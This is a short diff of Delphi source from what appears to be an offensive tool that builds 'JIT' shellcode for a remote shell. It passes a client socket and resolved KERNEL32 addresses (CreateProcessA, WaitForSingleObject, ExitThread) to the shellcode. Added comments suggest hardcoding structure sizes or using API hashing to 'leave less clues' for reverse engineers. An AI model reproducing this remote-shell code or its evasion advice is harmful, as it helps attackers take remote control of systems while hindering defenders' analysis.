@@ -144,10 +144,6 @@ begin
 
         ///
 
-        // This demo demonstrate JIT Shellcode Compilation, notice that you could also use
-        // API hashing and dynamic loading to avoid pre-loading / pre-computin libraries / APIs.
-        // The advantage here, is to improve shellcode SIZE and READABILITY.
-        // Both technique tho, are equally valid.
         AFuncInRemoteShellInfo.Header.Architecture := aUnsupported;
 
         {$IFDEF WIN32}
@@ -160,7 +156,21 @@ begin
 
         hKernel32 := GetModuleHandle('KERNEL32.DLL');
 
+        // Since bellow structures may change between architecture, you have two choice,
+        // First one is to dynamically gather expected size from the loader size (Like here)
+        // Or to leave less clues, you can hardcode those values in the controller and choose
+        // The correct hardcoded value depending on loader architecture.
+        AFuncInRemoteShellInfo.StartupInformationLen := SizeOf(TStartupInfoA);
+        AFuncInRemoteShellInfo.ProcessInformationLen := SizeOf(TProcessInformation);
+
         AFuncInRemoteShellInfo.SocketFd := AClient;
+
+        // This demo demonstrate JIT Shellcode Compilation, notice that you could also use
+        // API hashing and dynamic loading to avoid pre-loading / pre-computin libraries / APIs.
+        // The advantage here, is to improve shellcode SIZE and READABILITY.
+        // Both technique tho, are equally valid.
+        // Notice that, API Hashing or any additional equivalent technique will leave less clue
+        // during reverse engineering.
         AFuncInRemoteShellInfo.__WaitForSingleObject := NativeUInt(GetProcAddress(hKernel32, 'WaitForSingleObject'));
         AFuncInRemoteShellInfo.__CreateProcessA      := NativeUInt(GetProcAddress(hKernel32, 'CreateProcessA'));
         AFuncInRemoteShellInfo.__ExitThread          := NativeUInt(GetProcAddress(hKernel32, 'ExitThread'));
